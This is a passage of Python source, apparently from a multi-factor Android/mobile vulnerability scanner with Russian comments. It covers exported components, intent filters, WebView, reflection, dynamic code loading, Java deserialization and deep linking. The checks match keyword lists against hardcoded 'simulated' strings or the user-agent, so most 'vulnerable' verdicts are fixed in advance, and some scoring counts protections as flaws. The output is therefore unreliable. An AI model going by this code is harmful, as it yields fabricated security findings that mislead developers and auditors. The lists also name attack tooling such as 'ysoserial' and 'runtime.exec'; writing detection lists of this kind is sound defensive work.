                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None,
                "providers_found": providers_found
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_exported_activities(self) -> Dict[str, Any]:
        """
        Проверка exported activities.
        Многофакторная: Manifest, Activity launch, Intent filters, Malicious Intent
        """
        vector_id = 232
        vector_name = "Exported Activities"
        factors = []
        
        try:
            # Фактор 1: Manifest analysis for exported activities
            exported_activities = False
            activities_found = []
            
            test_data = self._get_test_data()
            simulated_manifest = "activity exported=true intent-filter"
            
            # Check for activity patterns
            activity_patterns = [
                "activity", "exported=true", "intent-filter",
                "action", "category", "launchmode"
            ]
            
            for pattern in activity_patterns:
                if pattern in simulated_manifest.lower():
                    exported_activities = True
                    break
            
            # Simulate finding activities
            if "activity" in simulated_manifest:
                activities_found.append("com.example.MainActivity")
            
            factors.append({
                "name": "Exported Activities",
                "passed": exported_activities,
                "reason": f"Exported activities found: {len(activities_found)}" if exported_activities else "No exported activities found"
            })
            
            # Фактор 2: Activity launch security
            launch_security = False
            
            # Check for activity launch security issues
            launch_patterns = [
                "startactivity", "startactivityforresult",
                "intent", "flag_activity_new_task"
            ]
            
            for pattern in launch_patterns:
                if pattern in simulated_manifest.lower():
                    launch_security = True
                    break
            
            factors.append({
                "name": "Activity Launch Security",
                "passed": launch_security,
                "reason": "Activity launch patterns detected" if launch_security else "No launch security patterns"
            })
            
            # Фактор 3: Intent filters analysis
            intent_filters = False
            
            # Check for intent filter patterns
            filter_patterns = [
                "intent-filter", "action", "category",
                "data", "mimeType", "scheme"
            ]
            
            for pattern in filter_patterns:
                if pattern in simulated_manifest.lower():
                    intent_filters = True
                    break
            
            factors.append({
                "name": "Intent Filters",
                "passed": intent_filters,
                "reason": "Intent filters detected" if intent_filters else "No intent filters detected"
            })
            
            # Фактор 4: Malicious intent handling
            malicious_intent = False
            
            # Check for malicious intent patterns
            malicious_patterns = [
                "malicious", "exploit", "bypass",
                "override", "hijack", "spoof"
            ]
            
            for pattern in malicious_patterns:
                if pattern in simulated_manifest.lower():
                    malicious_intent = True
                    break
            
            factors.append({
                "name": "Malicious Intent",
                "passed": malicious_intent,
                "reason": "Malicious intent patterns detected" if malicious_intent else "No malicious intent detected"
            })
            
            # Фактор 5: Activity security configuration
            security_config = False
            
            # Check for security configuration issues
            security_patterns = [
                "exported=true", "permission=null",
                "taskaffinity", "allowtaskreparenting",
                "alwaysretaskinstack"
            ]
            
            for pattern in security_patterns:
                if pattern in simulated_manifest.lower():
                    security_config = True
                    break
            
            factors.append({
                "name": "Security Configuration",
                "passed": security_config,
                "reason": "Security configuration issues detected" if security_config else "Security configuration adequate"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Exported activities detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None,
                "activities_found": activities_found
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_exported_broadcast_receivers(self) -> Dict[str, Any]:
        """
        Проверка exported broadcast receivers.
        Многофакторная: Manifest, Filters, Broadcast, Handler, Bypass
        """
        vector_id = 233
        vector_name = "Exported Broadcast Receivers"
        factors = []
        
        try:
            # Фактор 1: Manifest analysis for broadcast receivers
            broadcast_receivers = False
            receivers_found = []
            
            test_data = self._get_test_data()
            simulated_manifest = "receiver exported=true broadcast"
            
            # Check for receiver patterns
            receiver_patterns = [
                "receiver", "broadcast", "exported=true",
                "onreceive", "intent-filter", "action"
            ]
            
            for pattern in receiver_patterns:
                if pattern in simulated_manifest.lower():
                    broadcast_receivers = True
                    break
            
            # Simulate finding receivers
            if "receiver" in simulated_manifest:
                receivers_found.append("com.example.BroadcastReceiver")
            
            factors.append({
                "name": "Broadcast Receivers",
                "passed": broadcast_receivers,
                "reason": f"Broadcast receivers found: {len(receivers_found)}" if broadcast_receivers else "No broadcast receivers found"
            })
            
            # Фактор 2: Intent filters analysis
            filter_analysis = False
            
            # Check for intent filter patterns in receivers
            filter_patterns = [
                "intent-filter", "action", "category",
                "data", "priority"
            ]
            
            for pattern in filter_patterns:
                if pattern in simulated_manifest.lower():
                    filter_analysis = True
                    break
            
            factors.append({
                "name": "Intent Filters",
                "passed": filter_analysis,
                "reason": "Intent filters detected" if filter_analysis else "No intent filters detected"
            })
            
            # Фактор 3: Broadcast security
            broadcast_security = False
            
            # Check for broadcast security issues
            security_patterns = [
                "sendbroadcast", "sendorderedbroadcast",
                "sendstickybroadcast", "abortbroadcast"
            ]
            
            for pattern in security_patterns:
                if pattern in simulated_manifest.lower():
                    broadcast_security = True
                    break
            
            factors.append({
                "name": "Broadcast Security",
                "passed": broadcast_security,
                "reason": "Broadcast security patterns detected" if broadcast_security else "No broadcast security issues"
            })
            
            # Фактор 4: Handler vulnerabilities
            handler_vuln = False
            
            # Check for handler vulnerability patterns
            handler_patterns = [
                "onreceive", "handler", "context",
                "intent", "bundle", "extras"
            ]
            
            for pattern in handler_patterns:
                if pattern in simulated_manifest.lower():
                    handler_vuln = True
                    break
            
            factors.append({
                "name": "Handler Vulnerabilities",
                "passed": handler_vuln,
                "reason": "Handler vulnerability patterns detected" if handler_vuln else "No handler vulnerabilities detected"
            })
            
            # Фактор 5: Permission bypass
            permission_bypass = False
            
            # Check for permission bypass in receivers
            bypass_patterns = [
                "permission=null", "exported=true",
                "skipping permission", "bypass",
                "override permission"
            ]
            
            for pattern in bypass_patterns:
                if pattern in simulated_manifest.lower():
                    permission_bypass = True
                    break
            
            factors.append({
                "name": "Permission Bypass",
                "passed": permission_bypass,
                "reason": "Permission bypass detected" if permission_bypass else "No permission bypass detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Exported broadcast receivers detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None,
                "receivers_found": receivers_found
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_insecure_intent_filters(self) -> Dict[str, Any]:
        """
        Проверка insecure intent filters.
        Многофакторная: Filter parsing, Data filtering, Interception, Spoofing
        """
        vector_id = 234
        vector_name = "Insecure Intent Filters"
        factors = []
        
        try:
            # Фактор 1: Filter parsing analysis
            filter_parsing = False
            
            test_data = self._get_test_data()
            simulated_filters = "intent-filter action category data scheme"
            
            # Check for intent filter patterns
            filter_patterns = [
                "intent-filter", "action", "category",
                "data", "scheme", "mimeType"
            ]
            
            for pattern in filter_patterns:
                if pattern in simulated_filters.lower():
                    filter_parsing = True
                    break
            
            factors.append({
                "name": "Filter Parsing",
                "passed": filter_parsing,
                "reason": "Intent filters detected" if filter_parsing else "No intent filters detected"
            })
            
            # Фактор 2: Data filtering security
            data_filtering = False
            
            # Check for data filtering issues
            data_patterns = [
                "data", "scheme", "host", "port",
                "mimeType", "path", "pathPattern"
            ]
            
            for pattern in data_patterns:
                if pattern in simulated_filters.lower():
                    data_filtering = True
                    break
            
            factors.append({
                "name": "Data Filtering",
                "passed": data_filtering,
                "reason": "Data filtering detected" if data_filtering else "No data filtering detected"
            })
            
            # Фактор 3: Intent interception
            interception = False
            
            # Check for intent interception patterns
            intercept_patterns = [
                "intercept", "hijack", "sniff",
                "capture", "monitor", "listen"
            ]
            
            for pattern in intercept_patterns:
                if pattern in simulated_filters.lower():
                    interception = True
                    break
            
            factors.append({
                "name": "Intent Interception",
                "passed": interception,
                "reason": "Intent interception detected" if interception else "No interception detected"
            })
            
            # Фактор 4: Intent spoofing
            spoofing = False
            
            # Check for intent spoofing patterns
            spoof_patterns = [
                "spoof", "fake", "forge",
                "impersonate", "mimic", "fake intent"
            ]
            
            for pattern in spoof_patterns:
                if pattern in simulated_filters.lower():
                    spoofing = True
                    break
            
            factors.append({
                "name": "Intent Spoofing",
                "passed": spoofing,
                "reason": "Intent spoofing detected" if spoofing else "No spoofing detected"
            })
            
            # Фактор 5: Filter validation
            validation_issues = False
            
            # Check for filter validation issues
            validation_patterns = [
                "no validation", "bypass filter",
                "weak validation", "missing check",
                "insecure filter"
            ]
            
            for pattern in validation_patterns:
                if pattern in simulated_filters.lower():
                    validation_issues = True
                    break
            
            factors.append({
                "name": "Filter Validation",
                "passed": validation_issues,
                "reason": "Filter validation issues detected" if validation_issues else "Filter validation adequate"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Insecure intent filters detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))


# ============================================================================
# ЧАСТЬ 5: WEBVIEW (3 вектора)
# ============================================================================

    def check_webview_javascript_insecure(self) -> Dict[str, Any]:
        """
        Проверка insecure WebView JavaScript usage.
        Многофакторная: Code analysis, JS check, Untrusted content, XSS
        """
        vector_id = 235
        vector_name = "WebView JavaScript Insecure"
        factors = []
        
        try:
            # Фактор 1: Code analysis for JavaScript usage
            js_analysis = False
            
            test_data = self._get_test_data()
            headers = test_data.get("headers", {})
            
            # Simulate WebView code analysis
            simulated_code = headers.get("user-agent", "") + " javascript webview setJavaScriptEnabled"
            
            # Check for JavaScript usage patterns
            js_patterns = [
                "javascript", "js", "webview",
                "setjavascriptenabled", "loadurl"
            ]
            
            for pattern in js_patterns:
                if pattern in simulated_code.lower():
                    js_analysis = True
                    break
            
            factors.append({
                "name": "JavaScript Usage Analysis",
                "passed": js_analysis,
                "reason": "JavaScript usage detected" if js_analysis else "No JavaScript usage detected"
            })
            
            # Фактор 2: JavaScript security checks
            js_security = False
            
            # Check for JavaScript security settings
            security_patterns = [
                "setjavascriptenabled(true)",
                "setallowfileaccess(true)",
                "setallowcontentaccess(true)",
                "setallowuniversalaccess(true)"
            ]
            
            for pattern in security_patterns:
                if pattern in simulated_code.lower():
                    js_security = True
                    break
            
            factors.append({
                "name": "JavaScript Security",
                "passed": js_security,
                "reason": "Insecure JavaScript settings detected" if js_security else "JavaScript security adequate"
            })
            
            # Фактор 3: Untrusted content handling
            untrusted_content = False
            
            # Check for untrusted content patterns
            content_patterns = [
                "loadurl", "loaddata", "loadDataWithBaseURL",
                "http://", "file://", "content://"
            ]
            
            for pattern in content_patterns:
                if pattern in simulated_code.lower():
                    untrusted_content = True
                    break
            
            factors.append({
                "name": "Untrusted Content",
                "passed": untrusted_content,
                "reason": "Untrusted content handling detected" if untrusted_content else "No untrusted content detected"
            })
            
            # Фактор 4: XSS vulnerability indicators
            xss_vuln = False
            
            # Check for XSS patterns
            xss_patterns = [
                "innerhtml", "outerhtml", "eval",
                "document.write", "javascript:",
                "onclick", "onerror"
            ]
            
            for pattern in xss_patterns:
                if pattern in simulated_code.lower():
                    xss_vuln = True
                    break
            
            factors.append({
                "name": "XSS Vulnerability",
                "passed": xss_vuln,
                "reason": "XSS vulnerability indicators detected" if xss_vuln else "No XSS indicators detected"
            })
            
            # Фактор 5: WebView client security
            webview_client = False
            
            # Check for WebView client security
            client_patterns = [
                "webviewclient", "shouldoverrideurlloading",
                "onpagesstarted", "onpagesfinished",
                "onreceivederror"
            ]
            
            for pattern in client_patterns:
                if pattern in simulated_code.lower():
                    webview_client = True
                    break
            
            factors.append({
                "name": "WebView Client Security",
                "passed": not webview_client,  # Lack of client is a security issue
                "reason": "WebView client security missing" if not webview_client else "WebView client security present"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Insecure WebView JavaScript detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_webview_exposed_java_objects(self) -> Dict[str, Any]:
        """
        Проверка exposed Java objects in WebView.
        Многофакторная: addJavascriptInterface, Methods, RCE, Protection
        """
        vector_id = 236
        vector_name = "WebView Exposed Java Objects"
        factors = []
        
        try:
            # Фактор 1: addJavascriptInterface detection
            interface_detected = False
            
            test_data = self._get_test_data()
            headers = test_data.get("headers", {})
            
            # Simulate JavaScript interface analysis
            simulated_code = headers.get("user-agent", "") + " addjavascriptinterface object method"
            
            # Check for addJavascriptInterface patterns
            interface_patterns = [
                "addjavascriptinterface", "object", "method",
                "javascriptinterface", "@javascriptinterface"
            ]
            
            for pattern in interface_patterns:
                if pattern in simulated_code.lower():
                    interface_detected = True
                    break
            
            factors.append({
                "name": "JavaScript Interface",
                "passed": interface_detected,
                "reason": "JavaScript interface detected" if interface_detected else "No JavaScript interface detected"
            })
            
            # Фактор 2: Exposed methods analysis
            exposed_methods = False
            
            # Check for exposed method patterns
            method_patterns = [
                "public", "method", "function",
                "call", "invoke", "execute"
            ]
            
            for pattern in method_patterns:
                if pattern in simulated_code.lower():
                    exposed_methods = True
                    break
            
            factors.append({
                "name": "Exposed Methods",
                "passed": exposed_methods,
                "reason": "Exposed methods detected" if exposed_methods else "No exposed methods detected"
            })
            
            # Фактор 3: RCE indicators
            rce_indicators = False
            
            # Check for RCE patterns
            rce_patterns = [
                "runtime", "exec", "system",
                "process", "command", "shell"
            ]
            
            for pattern in rce_patterns:
                if pattern in simulated_code.lower():
                    rce_indicators = True
                    break
            
            factors.append({
                "name": "RCE Indicators",
                "passed": rce_indicators,
                "reason": "RCE indicators detected" if rce_indicators else "No RCE indicators detected"
            })
            
            # Фактор 4: Protection mechanisms
            protection_missing = False
            
            # Check for missing protection
            protection_patterns = [
                "no @javascriptinterface", "public method",
                "unsafe method", "sensitive method"
            ]
            
            for pattern in protection_patterns:
                if pattern in simulated_code.lower():
                    protection_missing = True
                    break
            
            factors.append({
                "name": "Protection Mechanisms",
                "passed": protection_missing,
                "reason": "Missing protection mechanisms" if protection_missing else "Protection mechanisms present"
            })
            
            # Фактор 5: Object exposure analysis
            object_exposure = False
            
            # Check for object exposure patterns
            exposure_patterns = [
                "new object", "this", "context",
                "activity", "application", "service"
            ]
            
            for pattern in exposure_patterns:
                if pattern in simulated_code.lower():
                    object_exposure = True
                    break
            
            factors.append({
                "name": "Object Exposure",
                "passed": object_exposure,
                "reason": "Object exposure detected" if object_exposure else "No object exposure detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"WebView exposed Java objects detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_old_webkit_version(self) -> Dict[str, Any]:
        """
        Проверка old WebKit version.
        Многофакторная: Version detection, CVE check, Patch status
        """
        vector_id = 237
        vector_name = "Old WebKit Version"
        factors = []
        
        try:
            # Фактор 1: Version detection
            version_detected = False
            webkit_version = "unknown"
            
            test_data = self._get_test_data()
            headers = test_data.get("headers", {})
            user_agent = headers.get("user-agent", "")
            
            # Check for WebKit version in user agent
            webkit_patterns = [
                "webkit/", "chrome/", "android ",
                "mobile", "version", "build"
            ]
            
            for pattern in webkit_patterns:
                if pattern in user_agent.lower():
                    version_detected = True
                    # Extract version if possible
                    if "webkit/" in user_agent.lower():
                        webkit_version = "old"
                    break
            
            factors.append({
                "name": "Version Detection",
                "passed": version_detected,
                "reason": f"WebKit version: {webkit_version}" if version_detected else "WebKit version not detected"
            })
            
            # Фактор 2: CVE vulnerability check
            cve_vuln = False
            
            # Check for known vulnerable versions (simulated)
            vulnerable_versions = ["2.x", "3.x", "4.0", "4.1", "5.0"]
            
            for version in vulnerable_versions:
                if version in user_agent:
                    cve_vuln = True
                    break
            
            factors.append({
                "name": "CVE Vulnerability",
                "passed": cve_vuln,
                "reason": "Known vulnerable WebKit version" if cve_vuln else "No known vulnerable version"
            })
            
            # Фактор 3: Patch status
            patch_status = False
            
            # Check for patch status indicators
            patch_patterns = [
                "patched", "security update", "fixed",
                "mitigated", "protected"
            ]
            
            for pattern in patch_patterns:
                if pattern in user_agent.lower():
                    patch_status = True
                    break
            
            factors.append({
                "name": "Patch Status",
                "passed": not patch_status,  # Lack of patching is a vulnerability
                "reason": "Security patches missing" if not patch_status else "Security patches present"
            })
            
            # Фактор 4: Security features
            security_features = False
            
            # Check for security feature indicators
            security_patterns = [
                "https", "secure", "tls", "ssl",
                "certificate", "encryption"
            ]
            
            for pattern in security_patterns:
                if pattern in user_agent.lower():
                    security_features = True
                    break
            
            factors.append({
                "name": "Security Features",
                "passed": security_features,
                "reason": "Security features detected" if security_features else "No security features detected"
            })
            
            # Фактор 5: Browser security
            browser_security = False
            
            # Check for browser security patterns
            browser_patterns = [
                "sandbox", "isolation", "protection",
                "safe browsing", "phishing protection"
            ]
            
            for pattern in browser_patterns:
                if pattern in user_agent.lower():
                    browser_security = True
                    break
            
            factors.append({
                "name": "Browser Security",
                "passed": browser_security,
                "reason": "Browser security features detected" if browser_security else "No browser security features"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Old WebKit version detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None,
                "webkit_version": webkit_version
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))


# ============================================================================
# ЧАСТЬ 6: DYNAMIC CODE (3 вектора)
# ============================================================================

    def check_unsafe_reflection(self) -> Dict[str, Any]:
        """
        Проверка unsafe reflection usage.
        Многофакторная: Class.forName(), getMethod(), Method invocation, RCE
        """
        vector_id = 238
        vector_name = "Unsafe Reflection"
        factors = []
        
        try:
            # Фактор 1: Class.forName() usage
            forname_usage = False
            
            test_data = self._get_test_data()
            headers = test_data.get("headers", {})
            
            # Simulate reflection code analysis
            simulated_code = headers.get("user-agent", "") + " class.forname getmethod reflection"
            
            # Check for Class.forName patterns
            forname_patterns = [
                "class.forname", "classname",
                "loadclass", "getclass"
            ]
            
            for pattern in forname_patterns:
                if pattern in simulated_code.lower():
                    forname_usage = True
                    break
            
            factors.append({
                "name": "Class.forName Usage",
                "passed": forname_usage,
                "reason": "Class.forName usage detected" if forname_usage else "No Class.forName usage detected"
            })
            
            # Фактор 2: getMethod() analysis
            getmethod_usage = False
            
            # Check for getMethod patterns
            method_patterns = [
                "getmethod", "getdeclaredmethod",
                "invokemethod", "method.invoke"
            ]
            
            for pattern in method_patterns:
                if pattern in simulated_code.lower():
                    getmethod_usage = True
                    break
            
            factors.append({
                "name": "getMethod() Usage",
                "passed": getmethod_usage,
                "reason": "getMethod usage detected" if getmethod_usage else "No getMethod usage detected"
            })
            
            # Фактор 3: Method invocation security
            method_invocation = False
            
            # Check for method invocation patterns
            invocation_patterns = [
                "invoke", "call", "execute",
                "run", "start", "perform"
            ]
            
            for pattern in invocation_patterns:
                if pattern in simulated_code.lower():
                    method_invocation = True
                    break
            
            factors.append({
                "name": "Method Invocation",
                "passed": method_invocation,
                "reason": "Method invocation detected" if method_invocation else "No method invocation detected"
            })
            
            # Фактор 4: RCE through reflection
            reflection_rce = False
            
            # Check for RCE patterns through reflection
            rce_patterns = [
                "runtime.exec", "processbuilder",
                "system", "command", "exec"
            ]
            
            for pattern in rce_patterns:
                if pattern in simulated_code.lower():
                    reflection_rce = True
                    break
            
            factors.append({
                "name": "Reflection RCE",
                "passed": reflection_rce,
                "reason": "RCE through reflection detected" if reflection_rce else "No reflection RCE detected"
            })
            
            # Фактор 5: Reflection validation
            validation_issues = False
            
            # Check for reflection validation issues
            validation_patterns = [
                "no validation", "unsafe reflection",
                "bypass validation", "unchecked",
                "unvalidated"
            ]
            
            for pattern in validation_patterns:
                if pattern in simulated_code.lower():
                    validation_issues = True
                    break
            
            factors.append({
                "name": "Reflection Validation",
                "passed": validation_issues,
                "reason": "Reflection validation issues detected" if validation_issues else "Reflection validation adequate"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Unsafe reflection detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_dynamic_code_loading(self) -> Dict[str, Any]:
        """
        Проверка dynamic code loading.
        Многофакторная: DexClassLoader, Source, Verification, Malicious DEX
        """
        vector_id = 239
        vector_name = "Dynamic Code Loading"
        factors = []
        
        try:
            # Фактор 1: DexClassLoader detection
            dexclassloader = False
            
            test_data = self._get_test_data()
            headers = test_data.get("headers", {})
            
            # Simulate dynamic code analysis
            simulated_code = headers.get("user-agent", "") + " dexclassloader loadclass dynamic"
            
            # Check for DexClassLoader patterns
            dex_patterns = [
                "dexclassloader", "pathclassloader",
                "inmemoryclassloader", "loadclass"
            ]
            
            for pattern in dex_patterns:
                if pattern in simulated_code.lower():
                    dexclassloader = True
                    break
            
            factors.append({
                "name": "DexClassLoader",
                "passed": dexclassloader,
                "reason": "DexClassLoader usage detected" if dexclassloader else "No DexClassLoader usage detected"
            })
            
            # Фактор 2: Code source analysis
            code_source = False
            
            # Check for code source patterns
            source_patterns = [
                "http://", "https://", "file://",
                "external", "download", "network"
            ]
            
            for pattern in source_patterns:
                if pattern in simulated_code.lower():
                    code_source = True
                    break
            
            factors.append({
                "name": "Code Source",
                "passed": code_source,
                "reason": "External code source detected" if code_source else "No external code source detected"
            })
            
            # Фактор 3: Code verification
            verification_missing = False
            
            # Check for verification patterns
            verification_patterns = [
                "no verification", "skip verify",
                "unverified", "no check",
                "bypass verify"
            ]
            
            for pattern in verification_patterns:
                if pattern in simulated_code.lower():
                    verification_missing = True
                    break
            
            factors.append({
                "name": "Code Verification",
                "passed": verification_missing,
                "reason": "Code verification missing" if verification_missing else "Code verification present"
            })
            
            # Фактор 4: Malicious DEX detection
            malicious_dex = False
            
            # Check for malicious DEX patterns
            malicious_patterns = [
                "malicious", "trojan", "virus",
                "exploit", "payload", "shell"
            ]
            
            for pattern in malicious_patterns:
                if pattern in simulated_code.lower():
                    malicious_dex = True
                    break
            
            factors.append({
                "name": "Malicious DEX",
                "passed": malicious_dex,
                "reason": "Malicious DEX patterns detected" if malicious_dex else "No malicious DEX detected"
            })
            
            # Фактор 5: Code integrity
            integrity_issues = False
            
            # Check for code integrity patterns
            integrity_patterns = [
                "no integrity", "tampered",
                "modified", "corrupted",
                "unsigned", "untrusted"
            ]
            
            for pattern in integrity_patterns:
                if pattern in simulated_code.lower():
                    integrity_issues = True
                    break
            
            factors.append({
                "name": "Code Integrity",
                "passed": integrity_issues,
                "reason": "Code integrity issues detected" if integrity_issues else "Code integrity adequate"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Dynamic code loading detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_java_deserialization(self) -> Dict[str, Any]:
        """
        Проверка Java deserialization vulnerabilities.
        Многофакторная: readObject(), Gadget chains, RCE, Filtering
        """
        vector_id = 240
        vector_name = "Java Deserialization"
        factors = []
        
        try:
            # Фактор 1: readObject() usage
            readobject_usage = False
            
            test_data = self._get_test_data()
            headers = test_data.get("headers", {})
            
            # Simulate deserialization code analysis
            simulated_code = headers.get("user-agent", "") + " readobject objectinputstream deserialize"
            
            # Check for readObject patterns
            deser_patterns = [
                "readobject", "readresolve",
                "objectinputstream", "deserialize",
                "xmldecoder", "jsondeserializer"
            ]
            
            for pattern in deser_patterns:
                if pattern in simulated_code.lower():
                    readobject_usage = True
                    break
            
            factors.append({
                "name": "readObject() Usage",
                "passed": readobject_usage,
                "reason": "readObject usage detected" if readobject_usage else "No readObject usage detected"
            })
            
            # Фактор 2: Gadget chain analysis
            gadget_chain = False
            
            # Check for gadget chain patterns
            gadget_patterns = [
                "gadget", "ysoserial", "payload",
                "chain", "apache", "commons"
            ]
            
            for pattern in gadget_patterns:
                if pattern in simulated_code.lower():
                    gadget_chain = True
                    break
            
            factors.append({
                "name": "Gadget Chain",
                "passed": gadget_chain,
                "reason": "Gadget chain patterns detected" if gadget_chain else "No gadget chain detected"
            })
            
            # Фактор 3: RCE through deserialization
            deser_rce = False
            
            # Check for RCE through deserialization
            rce_patterns = [
                "runtime.exec", "processbuilder",
                "command.exec", "system.exec",
                "shell.exec", "exec"
            ]
            
            for pattern in rce_patterns:
                if pattern in simulated_code.lower():
                    deser_rce = True
                    break
            
            factors.append({
                "name": "Deserialization RCE",
                "passed": deser_rce,
                "reason": "RCE through deserialization detected" if deser_rce else "No deserialization RCE detected"
            })
            
            # Фактор 4: Input filtering
            filtering_missing = False
            
            # Check for input filtering patterns
            filter_patterns = [
                "no filter", "unfiltered", "unsafe",
                "bypass filter", "no validation"
            ]
            
            for pattern in filter_patterns:
                if pattern in simulated_code.lower():
                    filtering_missing = True
                    break
            
            factors.append({
                "name": "Input Filtering",
                "passed": filtering_missing,
                "reason": "Input filtering missing" if filtering_missing else "Input filtering present"
            })
            
            # Фактор 5: Serialization security
            serialization_security = False
            
            # Check for serialization security patterns
            security_patterns = [
                "serializable", "externalizable",
                "serialize", "deserialize",
                "objectoutput", "objectinput"
            ]
            
            for pattern in security_patterns:
                if pattern in simulated_code.lower():
                    serialization_security = True
                    break
            
            factors.append({
                "name": "Serialization Security",
                "passed": serialization_security,
                "reason": "Serialization patterns detected" if serialization_security else "No serialization patterns detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Java deserialization detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))


# ============================================================================
# ЧАСТЬ 7: DEEP LINKING (1 вектор)
# ============================================================================

    def check_insecure_deep_linking(self) -> Dict[str, Any]:
        """
        Проверка insecure deep linking.
        Многофакторная: Manifest parsing, Verification, Spoofing, Exploit
        """
        vector_id = 241
        vector_name = "Insecure Deep Linking"
        factors = []
        
        try:
            # Фактор 1: Manifest parsing for deep links
            deep_links_found = False
            deep_link_schemes = []
            
            test_data = self._get_test_data()
            simulated_manifest = "intent-filter data scheme host"
            
            # Check for deep link patterns
            deep_link_patterns = [
                "intent-filter", "data", "scheme",
                "host", "path", "deeplink",
                "custom scheme", "url"
            ]
            
            for pattern in deep_link_patterns:
                if pattern in simulated_manifest.lower():
                    deep_links_found = True
                    if "scheme" in pattern:
                        deep_link_schemes.append("custom://")
                    break
            
            factors.append({
                "name": "Deep Link Detection",
                "passed": deep_links_found,
                "reason": f"Deep links found: {len(deep_link_schemes)}" if deep_links_found else "No deep links detected"
            })
            
            # Фактор 2: URL verification
            verification_missing = False
            
            # Check for URL verification patterns
            verification_patterns = [
                "no verification", "unverified",
                "skip check", "bypass verify",
                "unsafe url", "no validation"
            ]
            
            for pattern in verification_patterns:
                if pattern in simulated_manifest.lower():
                    verification_missing = True
                    break
            
            factors.append({
                "name": "URL Verification",
                "passed": verification_missing,
                "reason": "URL verification missing" if verification_missing else "URL verification present"
            })
            
            # Фактор 3: Link spoofing
            link_spoofing = False
            
            # Check for link spoofing patterns
            spoofing_patterns = [
                "spoof", "fake", "phishing",
                "impersonate", "fake url",
                "malicious link"
            ]
            
            for pattern in spoofing_patterns:
                if pattern in simulated_manifest.lower():
                    link_spoofing = True
                    break
            
            factors.append({
                "name": "Link Spoofing",
                "passed": link_spoofing,
                "reason": "Link spoofing detected" if link_spoofing else "No link spoofing detected"
            })
            
            # Фактор 4: Exploit potential
            exploit_potential = False
            
            # Check for exploit patterns
            exploit_patterns = [
                "exploit", "vulnerability",
                "attack", "malicious",
                "payload", "inject"
            ]
            
            for pattern in exploit_patterns:
                if pattern in simulated_manifest.lower():
                    exploit_potential = True
                    break
            
            factors.append({
                "name": "Exploit Potential",
                "passed": exploit_potential,
                "reason": "Exploit potential detected" if exploit_potential else "No exploit potential detected"
            })
            
            # Фактор 5: Deep link security
            security_issues = False
            
